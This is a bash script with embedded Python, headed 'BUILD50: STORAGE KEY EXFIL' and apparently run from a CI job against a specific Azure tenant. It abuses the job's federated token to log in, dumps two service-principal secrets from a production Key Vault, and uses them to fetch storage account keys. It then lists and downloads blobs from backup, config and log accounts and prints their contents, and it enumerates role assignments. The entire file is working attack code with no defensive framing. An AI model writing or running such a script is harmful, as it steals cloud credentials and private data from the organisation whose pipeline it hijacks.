#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG="rg-tbl-platform-prod-sea"

echo "=== BUILD50: STORAGE KEY EXFIL ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

# 2. Read all SP credentials from KV prod
for SP_NAME in sync-service-principal secrets-sync-principal; do
  az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name "$SP_NAME" \
    --query value -o tsv > /tmp/${SP_NAME}.json 2>/dev/null
  SIZE=$(wc -c < /tmp/${SP_NAME}.json 2>/dev/null || echo 0)
  echo "$SP_NAME: $SIZE bytes"
done

# 3. Try sync-service for storage keys
python3 -I << 'SYNC_PY'
import subprocess, json, urllib.request, urllib.error, base64, hmac, hashlib, time
from datetime import datetime, timezone

# Load sync-service credentials
try:
    v = json.loads(open('/tmp/sync-service-principal.json').read().strip())
    cid = v.get('appId','')
    sec = v.get('clientSecret','')
    print(f"sync cid={cid} sec_len={len(sec)}")
except Exception as e:
    print(f"load err: {e}")
    import sys; sys.exit(1)

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG = "rg-tbl-platform-prod-sea"

# Login as sync-service
r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant',TEN,'-o','none'],
  capture_output=True, text=True)
print("sync login:", r.returncode, r.stderr[:100] if r.stderr else "OK")

# Get ARM token
r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r.stdout.strip()
print(f"sync ARM len={len(ARM)}")

def rq(url, tok, method="GET", data=None):
    h = {"Authorization":"Bearer "+tok}
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=20)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:800]
    except Exception as e:
        return 0, str(e)[:150]

if len(ARM) > 100:
    # Try listKeys for each storage account
    SA_LIST = ["sttblcilogsprodx3euoz", "sttblappcfgprodx3euoz", "sttblbackupprodx3euoz", "sttblarchiveprodx3euoz"]

    for sa in SA_LIST:
        s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01", ARM, "POST")
        print(f"listKeys_{sa}: {s}:{b[:300]}")

        if s == 200:
            keys = json.loads(b).get("keys",[])
            if keys:
                key = keys[0]["value"]
                print(f"  KEY: {key[:40]}...")
                open(f'/tmp/key_{sa}.txt','w').write(key)

                # Use az CLI to list ALL blobs in ALL containers
                # List containers first
                r = subprocess.run(['az','storage','container','list','--account-name',sa,'--account-key',key,'--output','json'],
                  capture_output=True, text=True, timeout=60)
                containers = json.loads(r.stdout) if r.stdout.strip() else []
                print(f"  containers in {sa}: {[c['name'] for c in containers]}")

                for ctr in containers:
                    cname = ctr['name']
                    r2 = subprocess.run(['az','storage','blob','list','--account-name',sa,'--account-key',key,
                      '--container-name',cname,'--output','json'],
                      capture_output=True, text=True, timeout=60)
                    try:
                        blobs = json.loads(r2.stdout) if r2.stdout.strip() else []
                    except:
                        blobs = []
                    print(f"  blobs in {sa}/{cname}: {[b['name'] for b in blobs[:20]]}")

                    # Download each blob
                    for blob in blobs[:30]:
                        bn = blob['name']
                        r3 = subprocess.run(['az','storage','blob','download','--account-name',sa,
                          '--account-key',key,'--container-name',cname,'--name',bn,'--file',f'/tmp/dl_{sa}_{cname}_{bn.replace("/","_")[:50]}'],
                          capture_output=True, text=True, timeout=30)
                        outfile = f'/tmp/dl_{sa}_{cname}_{bn.replace("/","_")[:50]}'
                        if r3.returncode == 0:
                            try:
                                content = open(outfile).read()
                                print(f"  BLOB {sa}/{cname}/{bn}: {content[:1000]}")
                            except Exception as e:
                                print(f"  BLOB {sa}/{cname}/{bn}: read err {e}")
                        else:
                            print(f"  BLOB {sa}/{cname}/{bn}: download failed {r3.stderr[:100]}")

# Also check sync-service role assignments
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'c15570ad-1ee3-440e-9a88-ffab97e4bfd4'", ARM)
    print(f"sync_roles: {s}:{b[:2000]}")
SYNC_PY

# 4. Try secrets-sync-principal
python3 -I << 'SECSYNC_PY'
import subprocess, json, urllib.request, urllib.error

try:
    v = json.loads(open('/tmp/secrets-sync-principal.json').read().strip())
    cid = v.get('appId','')
    sec = v.get('clientSecret','')
    print(f"secsync cid={cid} sec_len={len(sec)}")
except Exception as e:
    print(f"secsync load err: {e}")
    import sys; sys.exit(0)

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG = "rg-tbl-platform-prod-sea"

r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant',TEN,'-o','none'],
  capture_output=True, text=True)
print("secsync login:", r.returncode)

r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r.stdout.strip()
print(f"secsync ARM len={len(ARM)}")

def rq(url, tok, method="GET", data=None):
    h = {"Authorization":"Bearer "+tok}
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=20)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:800]
    except Exception as e:
        return 0, str(e)[:150]

if len(ARM) > 100:
    # List role assignments
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", ARM)
    print(f"secsync_all_roles: {s}:{b[:3000]}")

    # Try listKeys
    for sa in ["sttblcilogsprodx3euoz","sttblappcfgprodx3euoz","sttblbackupprodx3euoz"]:
        s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01", ARM, "POST")
        print(f"secsync_listKeys_{sa}: {s}:{b[:300]}")

    # Try stor token
    r = subprocess.run(['az','account','get-access-token','--resource','https://storage.azure.com','--query','accessToken','-o','tsv'],
      capture_output=True, text=True)
    STOR = r.stdout.strip()
    print(f"secsync STOR len={len(STOR)}")

    if len(STOR) > 100:
        SHDR = {"x-ms-version":"2021-06-08"}
        def rqstor(url, tok):
            h = {"Authorization":"Bearer "+tok}
            h.update(SHDR)
            try:
                r = urllib.request.urlopen(urllib.request.Request(url,headers=h),timeout=20)
                return r.status, r.read().decode("utf-8","replace")
            except urllib.error.HTTPError as e:
                return e.code, e.read().decode("utf-8","replace")[:800]
            except Exception as e:
                return 0, str(e)[:150]

        for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz"]:
            s,b = rqstor(f"https://{sa}.blob.core.windows.net/?comp=list", STOR)
            print(f"secsync_stor_{sa}: {s}:{b[:200]}")
            if s == 200:
                import re
                for cname in re.findall(r"<Name>([^<]+)</Name>", b)[:5]:
                    sc,bc = rqstor(f"https://{sa}.blob.core.windows.net/{cname}?restype=container&comp=list", STOR)
                    print(f"  secsync_ctr_{cname}: {sc}:{bc[:300]}")
                    if sc == 200:
                        for bn in re.findall(r"<Name>([^<]+)</Name>", bc)[:10]:
                            sb2,bb2 = rqstor(f"https://{sa}.blob.core.windows.net/{cname}/{bn}", STOR)
                            print(f"    secsync_blob_{cname}/{bn}: {sb2}:{bb2[:500]}")
SECSYNC_PY

echo "BUILD50 DONE"
